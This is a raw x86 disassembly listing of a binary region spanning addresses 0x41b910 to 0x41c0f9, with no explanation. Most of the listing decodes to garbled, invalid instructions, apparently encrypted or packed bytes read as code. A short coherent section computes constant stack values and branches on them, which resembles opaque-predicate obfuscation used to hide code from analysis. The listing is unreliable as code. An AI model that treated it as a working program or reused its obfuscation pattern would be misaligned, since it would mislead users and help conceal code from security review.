  41b910:	xor    DWORD PTR [edi+0x4d],esi
  41b913:	adc    BYTE PTR [ecx+0x30],0xf0
  41b917:	push   0xffffff92
  41b919:	jae    0x41b985
  41b91b:	jno    0x41b8cb
  41b91d:	adc    BYTE PTR [eax+0x2890ce9f],ah
  41b923:	jne    0x41b913
  41b925:	push   esi
  41b926:	pop    ecx
  41b927:	in     al,dx
  41b928:	das    
  41b929:	sub    BYTE PTR gs:[eax],ch
  41b92c:	mov    BYTE PTR [eax+0x78],ch
  41b92f:	sub    al,BYTE PTR [edx-0x31425aa3]
  41b935:	pop    ebp
  41b936:	sub    BYTE PTR [ecx-0x1d3172b],dh
  41b93c:	add    al,0x5c
  41b93e:	sub    eax,esi
  41b940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b941:	mov    ebx,0x1961f897
  41b946:	nop
  41b947:	test   eax,0xad7bec36
  41b94c:	cdq    
  41b94d:	lods   eax,DWORD PTR ds:[esi]
  41b94e:	jge    0x41b8ea
  41b950:	fcmovnbe st,st(5)
  41b952:	outs   dx,BYTE PTR ds:[esi]
  41b953:	retf   
  41b954:	fnsave ds:0x1d3b47d4
  41b95a:	xor    eax,0x68c81d76
  41b95f:	xor    ebp,DWORD PTR [esi+0x6]
  41b962:	call   0xe066:0x243589ab
  41b969:	imul   esp,DWORD PTR [esp+ebx*2-0x5],0x34a6b3f3
  41b971:	jmp    0x538edf5a
  41b976:	jne    0x41b988
  41b978:	jne    0x41b993
  41b97a:	retf   
  41b97b:	pop    ecx
  41b97c:	pop    ds
  41b97d:	dec    edx
  41b97e:	lea    esi,[edx-0x32]
  41b981:	sbb    eax,DWORD PTR [eax-0x153f66e2]
  41b987:	sbb    al,BYTE PTR [ecx]
  41b989:	xchg   BYTE PTR [edi],cl
  41b98b:	fistp  QWORD PTR ds:0x384ce542
  41b991:	sub    ah,BYTE PTR [eax-0x7b255373]
  41b997:	lahf   
  41b998:	or     BYTE PTR [ebx-0x3bd05088],0x48
  41b99f:	pop    eax
  41b9a0:	mov    BYTE PTR [eax-0x4],dh
  41b9a3:	xchg   ebp,eax
  41b9a4:	ret    
  41b9a5:	mov    esi,0x19a9c11a
  41b9aa:	pop    es
  41b9ab:	aaa    
  41b9ac:	xchg   ebx,eax
  41b9ad:	retf   
  41b9ae:	and    BYTE PTR [ecx+0x7f2ee50],ah
  41b9b4:	push   ebp
  41b9b5:	dec    edi
  41b9b6:	in     al,0xf
  41b9b8:	sub    edx,DWORD PTR [ecx]
  41b9ba:	je     0x41b9d3
  41b9bc:	adc    esi,DWORD PTR [edx-0x6]
  41b9bf:	(bad)  [edi-0x6f]
  41b9c2:	in     eax,0xe0
  41b9c4:	jmp    0xb4d8:0x7d3d3e16
  41b9cb:	push   edx
  41b9cc:	inc    eax
  41b9cd:	cmp    al,0x3d
  41b9cf:	loopne 0x41b98f
  41b9d1:	not    ch
  41b9d3:	stc    
  41b9d4:	test   cl,bh
  41b9d6:	jp     0x41b97c
  41b9d8:	mov    ecx,0xe7ac601d
  41b9dd:	fild   WORD PTR [edi+0x66c6ce93]
  41b9e3:	shl    DWORD PTR [eax+0x5b4f15d0],0x45
  41b9ea:	mov    ds:0xaa9008,eax
  41b9ef:	add    eax,0x1b43c3f2
  41b9f4:	ja     0x41b9e8
  41b9f6:	and    ch,BYTE PTR [ecx-0x64fb2523]
  41b9fc:	and    edi,ebx
  41b9fe:	push   ecx
  41b9ff:	jmp    0x5a28:0xf20202ce
  41ba06:	std    
  41ba07:	pusha  
  41ba08:	or     BYTE PTR [edx-0x3c],dl
  41ba0b:	mov    edx,0xdcd2f755
  41ba10:	pop    ebp
  41ba11:	imul   ebp,DWORD PTR [ebx-0x3e88e2c1],0x36
  41ba18:	adc    DWORD PTR [edi+eax*8+0x12b2ab23],ebx
  41ba1f:	or     edx,DWORD PTR [eax-0x72]
  41ba22:	(bad)  
  41ba23:	loopne 0x41b9ee
  41ba25:	inc    ebp
  41ba26:	sahf   
  41ba27:	rol    edi,cl
  41ba29:	xchg   ecx,eax
  41ba2a:	inc    esp
  41ba2b:	push   eax
  41ba2c:	test   BYTE PTR [edx-0x30b1df34],0x46
  41ba33:	fisttp QWORD PTR [esi-0x7ba22eb2]
  41ba39:	pop    edx
  41ba3a:	add    bh,BYTE PTR [edi]
  41ba3c:	inc    edi
  41ba3d:	or     al,0xfc
  41ba3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba40:	jo     0x41b9f2
  41ba42:	sti    
  41ba43:	(bad)  
  41ba44:	aad    0x63
  41ba46:	pop    esi
  41ba47:	ja     0x41b9ee
  41ba49:	push   ds
  41ba4a:	call   0xb5f:0x914d264e
  41ba51:	dec    esi
  41ba52:	mov    ds:0xaf00a5f2,al
  41ba57:	sti    
  41ba58:	cli    
  41ba59:	xchg   ebx,eax
  41ba5a:	ror    DWORD PTR [esi+0x1195b28e],1
  41ba60:	jp     0x41bad0
  41ba62:	les    edx,FWORD PTR [edx+ebx*4+0x423c2498]
  41ba69:	push   edi
  41ba6a:	inc    ebp
  41ba6b:	hlt    
  41ba6c:	mov    bl,0x50
  41ba6e:	add    al,al
  41ba70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba71:	add    eax,eax
  41ba73:	push   edi
  41ba74:	adc    DWORD PTR [ebx+ecx*2-0x2a6c6088],esp
  41ba7b:	mov    ch,0x4c
  41ba7d:	push   esp
  41ba7e:	fistp  QWORD PTR [eax]
  41ba80:	or     esp,ebx
  41ba82:	adc    cl,BYTE PTR [edx-0x30]
  41ba85:	pop    ebx
  41ba86:	mov    fs,WORD PTR [eax+0x76]
  41ba89:	js     0x41ba31
  41ba8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba8c:	cmc    
  41ba8d:	or     DWORD PTR [eax+eiz*8-0x6c37bd95],edx
  41ba94:	inc    ebp
  41ba95:	dec    edx
  41ba96:	mov    ch,0x6c
  41ba98:	mov    ah,BYTE PTR [esi+0x66]
  41ba9b:	aas    
  41ba9c:	xchg   edi,eax
  41ba9d:	sbb    al,0xbe
  41ba9f:	cmc    
  41baa0:	aad    0xb9
  41baa2:	mov    edi,0x331d9620
  41baa7:	(bad)  
  41baa8:	aad    0xa1
  41baaa:	inc    esi
  41baab:	loop   0x41baf8
  41baad:	push   esp
  41baae:	add    bh,ch
  41bab0:	xchg   esi,eax
  41bab1:	test   DWORD PTR [eax+0x28],ecx
  41bab4:	or     eax,DWORD PTR [esi-0x949726e]
  41baba:	loop   0x41bad7
  41babc:	cli    
  41babd:	ret    
  41babe:	enter  0x6f05,0xd2
  41bac2:	mov    ecx,0x4a476c38
  41bac7:	repnz inc eax
  41bac9:	es cwde 
  41bacb:	or     dh,BYTE PTR ds:0x6270a412
  41bad1:	out    0x55,eax
  41bad3:	mov    al,0x69
  41bad5:	mov    edi,0x9fa10636
  41bada:	xor    DWORD PTR [esi-0x4bf45fdb],eax
  41bae0:	mov    ch,0x4
  41bae2:	add    BYTE PTR [ecx+0xb],ch
  41bae5:	and    ch,BYTE PTR [esi*2+0x700abe15]
  41baec:	xlat   BYTE PTR ds:[ebx]
  41baed:	lea    esi,[edi]
  41baef:	add    al,0x18
  41baf1:	js     0x41baff
  41baf3:	cdq    
  41baf4:	or     DWORD PTR [ecx-0x788972ec],eax
  41bafa:	rol    DWORD PTR [edx+0x16ab17ac],cl
  41bb00:	inc    ebx
  41bb01:	cmp    bl,ch
  41bb03:	mov    edx,0x754d29
  41bb08:	icebp  
  41bb09:	(bad)  
  41bb0a:	dec    ecx
  41bb0b:	je     0x41baf7
  41bb0d:	retf   
  41bb0e:	int    0x4
  41bb10:	sahf   
  41bb11:	inc    eax
  41bb12:	and    esi,DWORD PTR [ebp+0x71f4056]
  41bb18:	outs   dx,BYTE PTR ds:[esi]
  41bb19:	and    dl,dl
  41bb1b:	and    ebp,0x58
  41bb1e:	xor    ah,BYTE PTR [esi+ebx*4]
  41bb21:	mov    bh,0x96
  41bb23:	adc    eax,DWORD PTR [edi]
  41bb25:	into   
  41bb26:	test   BYTE PTR [ecx+0x62960cca],al
  41bb2c:	pop    edi
  41bb2d:	repz pop eax
  41bb2f:	mov    dh,0x5e
  41bb31:	sbb    ebx,DWORD PTR [edx+0x5]
  41bb34:	shl    DWORD PTR [ecx+0x11af301c],0xc8
  41bb3b:	mov    esi,0x7bd876f2
  41bb40:	inc    esi
  41bb41:	mov    dh,0xf4
  41bb43:	dec    esi
  41bb44:	call   esp
  41bb46:	dec    esi
  41bb47:	mov    al,ds:0x25b1ac68
  41bb4c:	test   DWORD PTR [edx+0x17],esi
  41bb4f:	fdivr  DWORD PTR [esi]
  41bb51:	inc    esi
  41bb52:	inc    eax
  41bb53:	add    eax,edx
  41bb55:	sahf   
  41bb56:	and    DWORD PTR [esi],0x996e810e
  41bb5c:	push   ds
  41bb5d:	adc    eax,DWORD PTR [esp+edx*1+0x12]
  41bb61:	cld    
  41bb62:	jmp    0x8fb6b504
  41bb67:	(bad)  
  41bb68:	adc    al,0x3d
  41bb6a:	ds xchg esi,eax
  41bb6c:	jp     0x41bb77
  41bb6e:	scas   eax,DWORD PTR es:[edi]
  41bb6f:	jne    0x41bb6f
  41bb71:	jmp    0x6f2d265b
  41bb76:	sub    BYTE PTR [ebx-0x3afeda4b],bh
  41bb7c:	into   
  41bb7d:	sbb    DWORD PTR [eax+0x29],0x13
  41bb81:	fwait
  41bb82:	ja     0x41bbfb
  41bb84:	push   ecx
  41bb85:	mov    esp,0x52b60325
  41bb8a:	mov    ds:0xec63033d,al
  41bb8f:	mov    dl,0xd9
  41bb91:	xor    eax,0xa1d3202d
  41bb96:	and    eax,0x4672be81
  41bb9b:	add    eax,0xcd03cb61
  41bba0:	lahf   
  41bba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bba2:	cli    
  41bba3:	sub    BYTE PTR [ebx-0x2f],bh
  41bba6:	inc    eax
  41bba7:	fdivr  st,st(6)
  41bba9:	into   
  41bbaa:	xchg   ebp,eax
  41bbab:	sbb    eax,0xc16e7ea3
  41bbb0:	sub    ebx,DWORD PTR [edx+0x14]
  41bbb3:	lods   eax,DWORD PTR ds:[esi]
  41bbb4:	mov    ebp,DWORD PTR [ecx+0x2c]
  41bbb7:	loop   0x41bbdd
  41bbb9:	ret    
  41bbba:	sub    eax,0xe4786457
  41bbbf:	xor    esi,ecx
  41bbc1:	push   es
  41bbc2:	jl     0x41bbf0
  41bbc4:	outs   dx,BYTE PTR ds:[esi]
  41bbc5:	test   eax,0xf8aca7dd
  41bbca:	xor    DWORD PTR [esi],eax
  41bbcc:	add    al,0xab
  41bbce:	gs add eax,0x2366b201
  41bbd4:	retf   0x8b66
  41bbd7:	push   esp
  41bbd8:	and    al,0x24
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	lea    edx,es:[ebx-0x56]
  41bc05:	add    eax,DWORD PTR [ecx+0x12bc1816]
  41bc0b:	sbb    BYTE PTR [eax],bl
  41bc0d:	mov    DWORD PTR [edi],ecx
  41bc0f:	add    esp,DWORD PTR [edi]
  41bc11:	inc    ecx
  41bc12:	fdiv   QWORD PTR [edx]
  41bc14:	aad    0xb1
  41bc16:	mov    bh,0x5b
  41bc18:	sahf   
  41bc19:	int    0x60
  41bc1b:	mov    dh,0xee
  41bc1d:	and    BYTE PTR [ebx-0x9dcdf3d],ch
  41bc23:	xchg   esi,eax
  41bc24:	pop    ss
  41bc25:	push   esp
  41bc26:	mov    ah,0x3a
  41bc28:	xchg   edx,eax
  41bc29:	add    ah,dl
  41bc2b:	lock dec esp
  41bc2d:	inc    ebx
  41bc2e:	jmp    0xbfa4:0x7a4ae3f2
  41bc35:	xchg   ebp,eax
  41bc36:	jo     0x41bbec
  41bc38:	xor    eax,0x6e5504e2
  41bc3d:	mov    al,ds:0x6a74c699
  41bc42:	into   
  41bc43:	or     ecx,ebx
  41bc45:	inc    ebp
  41bc46:	imul   ecx,DWORD PTR [ebx],0xffffffbb
  41bc49:	out    dx,eax
  41bc4a:	xchg   ebp,eax
  41bc4b:	pop    esi
  41bc4c:	test   eax,0x7b175015
  41bc51:	adc    ecx,DWORD PTR [edi]
  41bc53:	retf   0x8b85
  41bc56:	fadd   st(4),st
  41bc58:	jmp    FWORD PTR [esi]
  41bc5a:	push   cs
  41bc5b:	popf   
  41bc5c:	add    dh,BYTE PTR [esi]
  41bc5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc5f:	push   ecx
  41bc60:	repnz mov ecx,ss
  41bc63:	(bad)  
  41bc65:	and    al,0xe4
  41bc67:	inc    ebx
  41bc68:	and    BYTE PTR [ecx+eax*8-0x9],cl
  41bc6c:	xchg   ecx,eax
  41bc6d:	push   es
  41bc6e:	arpl   WORD PTR ds:0x7de8b64f,cx
  41bc74:	aad    0xb5
  41bc76:	jnp    0x41bc5e
  41bc78:	rol    al,cl
  41bc7a:	lea    ebp,[edx+esi*2]
  41bc7d:	xchg   DWORD PTR [ebx],eax
  41bc7f:	push   edi
  41bc80:	ror    DWORD PTR [edi+0x18],1
  41bc83:	jecxz  0x41bcb1
  41bc85:	mov    ds:0x72d9bedc,al
  41bc8a:	shl    DWORD PTR ds:0xcd97dfc4,cl
  41bc90:	into   
  41bc91:	repnz xor esp,DWORD PTR [eax+eax*8]
  41bc95:	popf   
  41bc96:	(bad)
  41bc99:	dec    esi
  41bc9a:	ret    0x6532
  41bc9d:	xlat   BYTE PTR ds:[ebx]
  41bc9e:	sub    bh,BYTE PTR [edx]
  41bca0:	mov    ecx,0x66a9163b
  41bca5:	daa    
  41bca6:	mov    al,ds:0x6faaba02
  41bcab:	mov    dl,0x32
  41bcad:	data16 in al,dx
  41bcaf:	xchg   edi,eax
  41bcb0:	dec    ebp
  41bcb1:	pop    edx
  41bcb2:	xor    dh,bl
  41bcb4:	adc    eax,ebx
  41bcb6:	and    dh,BYTE PTR [edx-0x6d]
  41bcb9:	les    edx,FWORD PTR [eax-0x9]
  41bcbc:	icebp  
  41bcbd:	mov    esp,0x9abe224a
  41bcc2:	(bad)  
  41bcc3:	sub    edi,DWORD PTR [edi]
  41bcc5:	into   
  41bcc6:	out    0xc9,eax
  41bcc8:	pop    ebp
  41bcc9:	aaa    
  41bcca:	mov    esp,0x4cea0e3
  41bccf:	xchg   esi,eax
  41bcd0:	jmp    0x8af5:0x8060a05e
  41bcd7:	imul   ecx,DWORD PTR [edi+0x4ec994a8],0x9ef4a36d
  41bce1:	inc    ebp
  41bce2:	test   BYTE PTR [eax],dh
  41bce4:	inc    ecx
  41bce5:	xchg   ebp,eax
  41bce6:	sub    ecx,DWORD PTR [ebp-0x7e]
  41bce9:	add    al,0xc4
  41bceb:	gs xchg ebp,eax
  41bced:	sub    ebp,DWORD PTR [ebx]
  41bcef:	aad    0x94
  41bcf1:	test   DWORD PTR [ebx-0x57],esi
  41bcf4:	add    BYTE PTR [edi+edi*4+0x2b],dl
  41bcf8:	cmp    al,BYTE PTR [eax+0x597efd8b]
  41bcfe:	int3   
  41bcff:	or     al,0x2c
  41bd01:	pop    edi
  41bd02:	pop    ebp
  41bd03:	(bad)  
  41bd04:	jmp    0x391de560
  41bd09:	mov    ds:0x7f9c7d2c,al
  41bd0e:	sbb    bl,ch
  41bd10:	sbb    DWORD PTR [eax+0x10],ebp
  41bd13:	scas   al,BYTE PTR es:[edi]
  41bd14:	add    al,0x95
  41bd16:	and    eax,0x3fe14854
  41bd1b:	cmp    eax,0x27bc788f
  41bd20:	add    DWORD PTR [edi],edi
  41bd22:	stos   DWORD PTR es:[edi],eax
  41bd23:	loopne 0x41bccf
  41bd25:	sbb    al,0xef
  41bd27:	pop    esp
  41bd28:	mov    cl,0x94
  41bd2a:	jmp    0xefda:0x1857a83d
  41bd31:	add    eax,0x8396958e
  41bd36:	daa    
  41bd37:	rol    DWORD PTR [ebp+eiz*8+0x4d],cl
  41bd3b:	dec    esp
  41bd3c:	daa    
  41bd3d:	cmp    al,ah
  41bd3f:	aas    
  41bd40:	inc    ecx
  41bd41:	dec    esi
  41bd42:	pop    edi
  41bd43:	vandnpd xmm2,xmm6,XMMWORD PTR [ecx-0x1]
  41bd48:	call   0xfe7c:0x87edffb2
  41bd4f:	gs pop ebx
  41bd51:	fbld   TBYTE PTR [eax-0x39]
  41bd54:	xor    BYTE PTR [esi-0x4c],al
  41bd57:	adc    ebp,esi
  41bd59:	inc    edi
  41bd5a:	out    dx,eax
  41bd5b:	inc    ebx
  41bd5c:	ret    
  41bd5d:	cmp    DWORD PTR [edx],0x900db035
  41bd63:	ss pop ecx
  41bd65:	jmp    0x275c:0xca78bd24
  41bd6c:	ficom  DWORD PTR [ecx-0x25]
  41bd6f:	sbb    ah,BYTE PTR [eax-0x544d5247]
  41bd75:	and    eax,DWORD PTR [ebx+ebx*2-0x4a8a866d]
  41bd7c:	push   eax
  41bd7d:	stc    
  41bd7e:	out    0xba,eax
  41bd80:	cmc    
  41bd81:	jecxz  0x41bd84
  41bd83:	inc    esi
  41bd84:	outs   dx,BYTE PTR ds:[esi]
  41bd85:	sbb    eax,0xd3cf6a53
  41bd8a:	mov    esp,0x423c75cd
  41bd8f:	(bad)  
  41bd90:	jmp    esi
  41bd92:	(bad)  
  41bd93:	addr16 mov al,ds:0x4b14
  41bd97:	mov    bh,0x92
  41bd99:	sub    al,0x7f
  41bd9b:	sbb    al,0xa1
  41bd9d:	sbb    eax,0x738f6c35
  41bda2:	push   edx
  41bda3:	mov    dl,0xdd
  41bda5:	inc    ebx
  41bda6:	inc    eax
  41bda7:	push   es
  41bda8:	cmp    BYTE PTR [esi-0x38],al
  41bdab:	scas   eax,DWORD PTR es:[edi]
  41bdac:	mov    ds:0x3971dc9b,eax
  41bdb1:	xchg   ebp,eax
  41bdb2:	sub    ebp,eax
  41bdb4:	sub    DWORD PTR [ecx+0x574738db],ebp
  41bdba:	add    BYTE PTR [ecx+0x3c5e0b30],0x60
  41bdc1:	or     eax,0x9c1720f2
  41bdc6:	arpl   WORD PTR ds:0x477675a4,cx
  41bdcc:	fstp   st(0)
  41bdce:	repz push cs
  41bdd0:	inc    ebp
  41bdd1:	test   al,0x17
  41bdd3:	pushf  
  41bdd4:	call   0xf9e0:0x40b5c49
  41bddb:	or     al,0x3d
  41bddd:	aam    0xca
  41bddf:	int    0xb7
  41bde1:	jae    0x41bdb1
  41bde3:	shl    cl,cl
  41bde5:	out    dx,al
  41bde6:	lds    esi,FWORD PTR [eax+edi*1]
  41bde9:	cmp    al,0x9
  41bdeb:	popf   
  41bdec:	push   0x36795e8
  41bdf1:	leave  
  41bdf2:	imul   DWORD PTR [edi-0x19]
  41bdf5:	push   0xffffff8e
  41bdf7:	lods   al,BYTE PTR ds:[esi]
  41bdf8:	mov    bh,0x3a
  41bdfa:	mov    edi,0x6cb69b9d
  41bdff:	mov    ebp,0x4ed049cf
  41be04:	out    0x93,al
  41be06:	dec    edi
  41be07:	add    BYTE PTR [ebx+0xa],0xca
  41be0b:	lods   eax,DWORD PTR ds:[esi]
  41be0c:	lods   eax,DWORD PTR ds:[esi]
  41be0d:	clc    
  41be0e:	xor    bh,BYTE PTR [eax]
  41be10:	stos   DWORD PTR es:[edi],eax
  41be11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be12:	inc    ebx
  41be13:	ds dec esi
  41be15:	cmp    al,0xf1
  41be17:	fucomp st(7)
  41be19:	fiadd  DWORD PTR [esi+0x5821ac0c]
  41be1f:	mov    ch,0xf7
  41be21:	mov    ebp,0x7f2f6464
  41be26:	out    0xa7,al
  41be28:	ret    0xda17
  41be2b:	push   edx
  41be2c:	fmul   DWORD PTR [esi]
  41be2e:	fs enter 0xe3e7,0xfd
  41be33:	int    0x8b
  41be35:	(bad)  
  41be36:	mov    al,0x55
  41be38:	pop    ss
  41be39:	lods   eax,DWORD PTR ds:[esi]
  41be3a:	dec    edi
  41be3b:	xor    eax,esp
  41be3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be3e:	xchg   edi,eax
  41be3f:	xchg   esp,eax
  41be40:	push   eax
  41be41:	push   0x819622fc
  41be46:	inc    esp
  41be47:	adc    ah,BYTE PTR [esi+0x21d2125]
  41be4d:	inc    edx
  41be4e:	jo     0x41bdf5
  41be50:	sbb    dh,BYTE PTR [edi+eiz*4-0x70]
  41be54:	or     DWORD PTR [eax+eax*1-0x18],eax
  41be58:	sbb    BYTE PTR [ecx],al
  41be5a:	popf   
  41be5b:	scas   al,BYTE PTR es:[edi]
  41be5c:	jmp    0x41be3a
  41be5e:	popf   
  41be5f:	fdiv   QWORD PTR [eax+ebp*4-0x3fbdc37d]
  41be66:	mov    edi,esp
  41be68:	lea    edi,[esi+0x68]
  41be6b:	and    edx,esi
  41be6d:	mov    ecx,DWORD PTR [ecx-0x63aa0096]
  41be73:	bound  ecx,QWORD PTR [ecx-0x3ed1af49]
  41be79:	repz cmp dh,BYTE PTR [edx+eiz*8]
  41be7d:	jnp    0x3fe6c5fa
  41be83:	and    eax,0xed8c0b88
  41be88:	repz iret 
  41be8a:	sbb    DWORD PTR [ebx+ebp*1-0x15],0x13
  41be8f:	xchg   BYTE PTR [edi+esi*2],dl
  41be92:	es retf 
  41be94:	mov    esp,ebp
  41be96:	es pop ecx
  41be98:	repz imul esi,DWORD PTR [ebx-0x17467df4],0x8f3f162c
  41bea3:	push   0x6f173a7b
  41bea8:	sbb    DWORD PTR [edi-0x140415f7],edx
  41beae:	xchg   esi,ebx
  41beb0:	adc    edx,0xffffff99
  41beb3:	adc    DWORD PTR [edi-0x1e],0x6d
  41beb7:	mov    bl,0x99
  41beb9:	push   0xffffffe9
  41bebb:	lods   al,BYTE PTR ds:[esi]
  41bebc:	sar    ebp,cl
  41bebe:	clc    
  41bebf:	inc    edx
  41bec0:	fild   DWORD PTR [edi+eiz*8]
  41bec3:	fidiv  WORD PTR [ebx]
  41bec5:	pop    eax
  41bec6:	adc    ch,0xe9
  41bec9:	fcomp  QWORD PTR [esp+ebp*4+0x9bb3d66]
  41bed0:	mul    BYTE PTR [ebp+0x76fc84c6]
  41bed6:	daa    
  41bed7:	repnz dec esi
  41bed9:	cdq    
  41beda:	dec    ebp
  41bedb:	loope  0x41beaf
  41bedd:	cmp    al,0x5c
  41bedf:	adc    al,0x31
  41bee1:	sbb    al,0x2a
  41bee3:	adc    BYTE PTR [esi],dl
  41bee5:	mov    dl,0x91
  41bee7:	xor    DWORD PTR [eax-0xe],esi
  41beea:	xor    edx,DWORD PTR [ebp-0x21]
  41beed:	inc    esi
  41beee:	pop    DWORD PTR [edi-0x14d6217a]
  41bef4:	sub    BYTE PTR [edx+0x27c99cce],ah
  41befa:	add    eax,edi
  41befc:	repnz add dh,BYTE PTR [ebx+0x473c5dc8]
  41bf03:	mov    bh,0x20
  41bf05:	xchg   esi,eax
  41bf06:	out    0x2f,eax
  41bf08:	repnz mov edx,0x3212644a
  41bf0e:	mov    gs,ebp
  41bf10:	arpl   di,bp
  41bf12:	(bad)  
  41bf13:	aam    0x48
  41bf15:	mov    ds:0x563ab8a9,eax
  41bf1a:	jns    0x41beda
  41bf1c:	xchg   edi,eax
  41bf1d:	sti    
  41bf1e:	rcr    BYTE PTR [edx-0x9],1
  41bf21:	fwait
  41bf22:	push   ds
  41bf23:	popf   
  41bf24:	mov    ch,0x78
  41bf26:	mov    eax,0xfe1ade0e
  41bf2b:	or     al,0xee
  41bf2d:	lock inc edi
  41bf2f:	ds in  al,dx
  41bf31:	cmp    BYTE PTR [ebx+edi*8+0x344d9748],dh
  41bf38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf39:	pop    edx
  41bf3a:	sbb    DWORD PTR [esi-0x500ef629],0xd3dac9ec
  41bf44:	lea    esi,[edx+edx*1]
  41bf47:	mov    ds:0x7f8179be,al
  41bf4c:	adc    DWORD PTR [edi+0x6d],esp
  41bf4f:	push   edx
  41bf50:	rol    BYTE PTR [ecx-0xd],0x37
  41bf54:	ins    BYTE PTR es:[edi],dx
  41bf55:	sbb    DWORD PTR [ecx+ebp*1+0x1b],esi
  41bf59:	pop    es
  41bf5a:	mov    edi,eax
  41bf5c:	push   esp
  41bf5d:	mov    ah,0x8d
  41bf5f:	jmp    0x6413:0x1f5f01cd
  41bf66:	cmp    BYTE PTR [edx+ecx*4+0x6f],0x1c
  41bf6b:	repnz pushf 
  41bf6d:	jb     0x41bf01
  41bf6f:	sub    al,0xee
  41bf71:	out    dx,eax
  41bf72:	sbb    DWORD PTR gs:[ebp+0x2c],eax
  41bf76:	clc    
  41bf77:	or     bl,0x70
  41bf7a:	mov    WORD PTR [edi-0x2b72523c],cs
  41bf80:	outs   dx,DWORD PTR ds:[esi]
  41bf81:	jne    0x41bf31
  41bf83:	jmp    0x41bf8c
  41bf85:	aam    0xf7
  41bf87:	dec    eax
  41bf88:	xor    BYTE PTR [ecx-0x3225f48e],ah
  41bf8e:	aas    
  41bf8f:	out    0x4b,al
  41bf91:	fs xor al,0x43
  41bf94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf95:	les    ecx,FWORD PTR [eax+ebp*8+0x5355fbd1]
  41bf9c:	or     eax,0x91345989
  41bfa1:	mov    ebx,0x9c0e3a49
  41bfa6:	mov    eax,DWORD PTR [ecx-0x544dbe1d]
  41bfac:	xchg   ebp,eax
  41bfad:	xchg   DWORD PTR [edx],esi
  41bfaf:	push   ds
  41bfb0:	push   edx
  41bfb1:	retf   0x5704
  41bfb4:	mov    bl,0xa4
  41bfb6:	sub    al,0x1b
  41bfb8:	mov    al,0x2b
  41bfba:	daa    
  41bfbb:	xchg   edx,eax
  41bfbc:	ja     0x41bfbf
  41bfbe:	cmp    BYTE PTR [ecx+0x57d4],0x66
  41bfc5:	mov    DWORD PTR [esp+0x2c],ecx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	lock push esi
  41c0f8:	push   ebp
  41c0f9:	stos   BYTE PTR es:[edi],al
